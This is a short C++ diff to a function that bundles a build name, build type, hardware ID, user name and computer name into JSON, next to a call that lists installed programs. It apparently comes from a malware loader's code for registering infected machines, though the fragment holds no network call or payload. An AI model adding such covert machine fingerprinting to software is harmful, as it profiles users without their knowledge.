@@ -35,10 +35,12 @@ namespace absent
 				getInstalledPrograms();
 			}
 
-			nlohmann::json getJson(std::string buildName)
+			nlohmann::json getJson(std::string buildName, std::string buildType, std::string build)
 			{
 				nlohmann::json jInfo = {
 					{"bn", buildName},
+					{"bt", buildType},
+					{"bu", build},
 					{"hw", hardwareID},
 					{"un", userName},
 					{"cn", computerName},
